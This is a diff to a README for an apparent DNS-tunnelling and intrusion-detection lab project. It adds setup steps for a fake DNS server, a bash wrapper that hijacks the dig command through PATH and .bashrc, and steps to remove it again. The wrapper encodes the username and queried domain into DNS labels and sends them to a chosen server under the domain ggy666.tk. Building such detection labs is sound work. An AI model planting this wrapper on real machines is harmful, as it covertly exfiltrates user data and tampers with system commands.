@@ -452,7 +452,168 @@ python3 ids_monitor.py
 sudo rm -f fast.log eve.json stats.log && sudo suricata -r ~/745_project/iodine-txt.pcap
 ```
 
+# 4 Malware setup for Server& Client sides
 
+## 4.1 Malware setup for DNS Server(Windows side)
 
+1. Install the dependencies
+```bash
+pip install dnslib
+```
 
+or 
 
+```bash
+pip3 install dnslib
+```
+2. Run fake DNS server
+
+```bash
+python .\fake_dns_server.py
+```
+
+or
+
+```bash
+python3 .\fake_dns_server.py
+```
+## 4.2 Malware Setup for Client Side (WSL2)
+
+### 1. Identify the Windows Gateway IP
+
+Run the following commands in WSL2:
+
+```bash
+ip route | grep default
+cat /etc/resolv.conf
+```
+
+Pay attention to the following output:
+
+```bash
+default via X.X.X.X dev eth0
+```
+
+or:
+
+```bash
+nameserver X.X.X.X
+```
+
+The `X.X.X.X` value is the Windows gateway IP that should be used by the current `dig` command or wrapper.
+
+### 2. Create the Wrapper
+
+```bash
+mkdir -p ~/.local/bin
+nano ~/.local/bin/dig
+```
+
+Add the following content:
+
+```bash
+#!/bin/bash
+
+REAL_DIG="/usr/bin/dig"
+
+DNS_SERVER="172.23.48.1"
+DNS_PORT="5300"
+DOMAIN="ggy666.tk"
+
+ORIGINAL_DOMAIN="$1"
+
+if [[ -z "$ORIGINAL_DOMAIN" ]]; then
+    exec "$REAL_DIG"
+fi
+
+# Only include short data to avoid DNS labels becoming too long
+DATA="u=$(whoami),q=${ORIGINAL_DOMAIN}"
+
+ENCODED=$(echo -n "$DATA" | base64 | tr '+/' '-_' | tr -d '=')
+
+# Important: split the encoded string every 40 characters
+# to avoid a single DNS label exceeding 63 characters
+CHUNKED=$(echo "$ENCODED" | fold -w 40 | paste -sd "." -)
+
+NEW_QUERY="${CHUNKED}.${ORIGINAL_DOMAIN}.${DOMAIN}"
+
+echo "[WRAPPER] original query: $ORIGINAL_DOMAIN"
+echo "[WRAPPER] modified query: $NEW_QUERY"
+
+exec "$REAL_DIG" @"$DNS_SERVER" -p "$DNS_PORT" "$NEW_QUERY" TXT +short
+```
+
+After saving the file, run:
+
+```bash
+chmod +x ~/.local/bin/dig
+```
+
+### 3. Make Sure the Wrapper Runs First
+
+Run:
+
+```bash
+echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
+source ~/.bashrc
+```
+
+Check the current `dig` path:
+
+```bash
+which dig
+```
+
+You should see:
+
+```bash
+/home/<username>/.local/bin/dig
+```
+
+The real `dig` command is still located at:
+
+```bash
+/usr/bin/dig
+```
+
+### 4. Test the Wrapper
+
+Now run the following command in WSL2:
+
+```bash
+dig google.com
+```
+
+The wrapper will modify the query into something similar to:
+
+```text
+base64data.google.com.ggy666.tk
+```
+
+Then it will send the request to the `Fake DNS Server` or the `Poisoned DNS Server`.
+
+### 5. Restore the Original `dig`
+
+Remove the wrapper directly:
+
+```bash
+rm ~/.local/bin/dig
+```
+
+Then reload the shell configuration:
+
+```bash
+source ~/.bashrc
+```
+
+Check the `dig` path again:
+
+```bash
+which dig
+```
+
+It should be restored to:
+
+```bash
+/usr/bin/dig
+```
